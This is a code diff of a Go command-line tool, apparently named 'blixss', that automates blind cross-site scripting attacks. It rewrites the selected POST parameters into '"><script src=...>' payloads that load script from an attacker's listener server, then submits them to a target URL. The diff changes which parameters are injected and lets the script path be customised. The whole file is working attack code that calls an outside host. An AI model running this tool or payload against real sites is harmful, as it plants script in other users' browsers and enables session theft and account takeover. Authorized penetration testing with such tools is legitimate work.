@@ -6,34 +6,29 @@ import (
 	"fmt"
 	"net/http"
 	"net/url"
-	"regexp"
-	"slices"
 	"strconv"
 	"strings"
 )
 
-//Usage blixss -target <<target url>> -body <<post body>> -listener <<listener server>> -not <<omitted parameters>>
-// e.g "blixss -target "http://example.com" -body "parameter1=test&parameter2=test2&parameter3=test3" -listener "http://10.10.15.122:45000" -not "parameter2,parameter3"
-
+// Usage blixss -t <<target url>> -b <<post body>> -l <<listener server>> -d <<custom/request/directory>>
+// e.g "blixss -target "http://example.com" -body "parameter1=XSS&parameter2=test2&parameter3=XSS" -listener "http://10.10.15.122:45000" -not "parameter2,parameter3"
+// Parameter values different from 'XSS' will not be tested
 import (
 	"os"
 )
-
 func main() {
 
 	var (
 		targetUrl      string
 		postBody       string
 		listenerServer string
-		not            string
+		custom	string
 	)
 
-	notRegPattern := "^\\w+(,\\w+)*$"
-
-	flag.StringVar(&targetUrl, "target", "", "Target URL")
-	flag.StringVar(&postBody, "body", "", "Post Body")
-	flag.StringVar(&listenerServer, "listener", "", "Server Listener")
-	flag.StringVar(&not, "not", "", "Omitted parameters.")
+	flag.StringVar(&targetUrl, "t", "", "Target URL")
+	flag.StringVar(&postBody, "b", "", "Body strings with the parameters of the request.")
+	flag.StringVar(&listenerServer, "l", "", "URL to forward the requests to ")
+	flag.StringVar(&custom, "d", "", "Specifies custom directory to make the GET request. If not specified, it will attach /<<paramName>> on the request.")
 	flag.Parse()
 
 	// Check if target is valid URL
@@ -53,16 +48,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	//Check omited values
-	if not != "" {
-		match, err := regexp.MatchString(notRegPattern, not)
-		if err != nil || match != false {
-			fmt.Println("Invalid not flag format. Use -not \"parameter1,parameter2\"")
-			os.Exit(1)
-		}
-	}
-	notArray := strings.Split(not, ",")
-
 	//Check is listener is valid
 	if listenerServer == "" {
 		fmt.Println("You must specify a server to forward the requests. Please use -listener \"http://address\"")
@@ -72,8 +57,14 @@ func main() {
 		listenerServer = listenerServer[:len(listenerServer)-1]
 	}
 
+
+	//Removing '/' from custom if existing.
+	if strings.HasPrefix(custom, "/") {
+		custom = custom[1:len(custom)]
+	}
+	
 	//Re-encoding body data and crafting malicious request
-	payload := getPayload(bodyValues, listenerServer, notArray).Encode()
+	payload := getPayload(bodyValues, listenerServer, custom).Encode()
 	client := &http.Client{}
 	req, err := http.NewRequest("POST", targetUrl, bytes.NewBuffer([]byte(payload)))
 	if err != nil {
@@ -91,14 +82,20 @@ func main() {
 
 }
 
-func getPayload(body url.Values, listener string, not []string) url.Values {
+func getPayload(body url.Values, listener string, custom string) url.Values {
 	payload := url.Values{}
 	for paramName, paramValue := range body {
-		if slices.Contains(not, paramName) {
-			//If user indicates to omit this param, we set the input value.
+		if paramValue[0] != "XSS" {
+			//If user does not want to test this parameter, we set it to the input value.
 			payload.Add(paramName, paramValue[0])
 		} else {
-			newValue := "\"><script src=\"" + listener + "/" + paramName + "\"></script>"
+			newValue := "\"><script src=\"" + listener + "/"
+			if custom == "" {
+				newValue += paramName 
+			} else {
+				newValue += custom
+			}
+			newValue += "\"></script>"
 			payload.Add(paramName, newValue)
 		}
 	}
